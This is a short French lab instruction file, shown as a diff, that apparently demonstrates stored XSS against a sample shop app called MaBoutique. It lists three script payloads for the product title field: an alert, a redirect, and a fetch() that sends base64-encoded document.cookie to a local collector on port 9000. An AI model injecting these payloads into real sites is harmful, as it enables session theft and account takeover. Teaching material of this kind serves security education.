@@ -1,0 +1,5 @@
+1. Lancer le projet attacker-code/xss (lancer le conteneur)
+2. Dans l'application MaBoutique, dans l'ajout de nouveau produit, saisissez le ce qui suit dans le titre du produit :
+	a. Test 2<script>alert("Exemple XSS");</script>
+	b. Test 2<script>window.location.href="https://google.com";</script>
+	c. Test <script>fetch("http://localhost:9000/index.php?data=" + btoa(document.cookie));</script>
